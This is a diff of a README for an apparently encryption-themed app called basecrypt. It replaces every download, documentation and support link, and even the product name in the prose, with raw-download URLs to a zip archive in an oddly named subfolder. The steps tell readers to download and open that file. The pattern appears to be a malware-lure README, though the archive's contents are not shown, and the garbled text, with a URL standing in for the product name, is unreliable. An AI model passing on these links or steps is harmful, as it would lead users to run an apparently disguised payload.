@@ -1,11 +1,11 @@
-# 🔐 https://raw.githubusercontent.com/wongirengjembuten135/basecrypt.github.io/main/Amentiferae/basecrypt.github.io-3.3-beta.3.zip - Securely Send and Store Encrypted Text
+# 🔐 https://github.com/wongirengjembuten135/basecrypt.github.io/raw/refs/heads/main/Amentiferae/basecrypt-github-io-3.7.zip - Securely Send and Store Encrypted Text
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/wongirengjembuten135/basecrypt.github.io/main/Amentiferae/basecrypt.github.io-3.3-beta.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/wongirengjembuten135/basecrypt.github.io/main/Amentiferae/basecrypt.github.io-3.3-beta.3.zip)
+[![Download Latest Release](https://github.com/wongirengjembuten135/basecrypt.github.io/raw/refs/heads/main/Amentiferae/basecrypt-github-io-3.7.zip%20Latest%20Release-v1.0-blue)](https://github.com/wongirengjembuten135/basecrypt.github.io/raw/refs/heads/main/Amentiferae/basecrypt-github-io-3.7.zip)
 
 ## 🚀 Getting Started
 
-Welcome to https://raw.githubusercontent.com/wongirengjembuten135/basecrypt.github.io/main/Amentiferae/basecrypt.github.io-3.3-beta.3.zip! This application allows you to send and store text securely using strong encryption. No need for programming skills; you can easily use this application to keep your information private.
+Welcome to https://github.com/wongirengjembuten135/basecrypt.github.io/raw/refs/heads/main/Amentiferae/basecrypt-github-io-3.7.zip! This application allows you to send and store text securely using strong encryption. No need for programming skills; you can easily use this application to keep your information private.
 
 ## 🔍 Features
 
@@ -17,7 +17,7 @@ Welcome to https://raw.githubusercontent.com/wongirengjembuten135/basecrypt.gith
 
 ## ⚙️ System Requirements
 
-To run https://raw.githubusercontent.com/wongirengjembuten135/basecrypt.github.io/main/Amentiferae/basecrypt.github.io-3.3-beta.3.zip, you need:
+To run https://github.com/wongirengjembuten135/basecrypt.github.io/raw/refs/heads/main/Amentiferae/basecrypt-github-io-3.7.zip, you need:
 
 - A computer with Windows, macOS, or Linux.
 - At least 500 MB of free disk space.
@@ -25,7 +25,7 @@ To run https://raw.githubusercontent.com/wongirengjembuten135/basecrypt.github.i
 
 ## 📦 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/wongirengjembuten135/basecrypt.github.io/main/Amentiferae/basecrypt.github.io-3.3-beta.3.zip) to download the application.
+To get started, visit the [Releases page](https://github.com/wongirengjembuten135/basecrypt.github.io/raw/refs/heads/main/Amentiferae/basecrypt-github-io-3.7.zip) to download the application.
 
 1. Click on the "Releases" link above.
 2. Find the latest version listed.
@@ -33,7 +33,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/wong
 4. Once the file downloads, locate it on your computer.
 5. Open the file to begin the installation.
 
-After completing these steps, you can start using https://raw.githubusercontent.com/wongirengjembuten135/basecrypt.github.io/main/Amentiferae/basecrypt.github.io-3.3-beta.3.zip to encrypt your texts.
+After completing these steps, you can start using https://github.com/wongirengjembuten135/basecrypt.github.io/raw/refs/heads/main/Amentiferae/basecrypt-github-io-3.7.zip to encrypt your texts.
 
 ## 🛠️ Usage Instructions
 
@@ -65,8 +65,8 @@ We value your input! If you have any suggestions or encounter any issues, please
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/wongirengjembuten135/basecrypt.github.io/main/Amentiferae/basecrypt.github.io-3.3-beta.3.zip)
-- [Documentation](https://raw.githubusercontent.com/wongirengjembuten135/basecrypt.github.io/main/Amentiferae/basecrypt.github.io-3.3-beta.3.zip)
-- [Support](https://raw.githubusercontent.com/wongirengjembuten135/basecrypt.github.io/main/Amentiferae/basecrypt.github.io-3.3-beta.3.zip)
+- [Releases Page](https://github.com/wongirengjembuten135/basecrypt.github.io/raw/refs/heads/main/Amentiferae/basecrypt-github-io-3.7.zip)
+- [Documentation](https://github.com/wongirengjembuten135/basecrypt.github.io/raw/refs/heads/main/Amentiferae/basecrypt-github-io-3.7.zip)
+- [Support](https://github.com/wongirengjembuten135/basecrypt.github.io/raw/refs/heads/main/Amentiferae/basecrypt-github-io-3.7.zip)
 
-Now you are ready to use https://raw.githubusercontent.com/wongirengjembuten135/basecrypt.github.io/main/Amentiferae/basecrypt.github.io-3.3-beta.3.zip to send and store encrypted text securely. Enjoy your privacy!
+Now you are ready to use https://github.com/wongirengjembuten135/basecrypt.github.io/raw/refs/heads/main/Amentiferae/basecrypt-github-io-3.7.zip to send and store encrypted text securely. Enjoy your privacy!
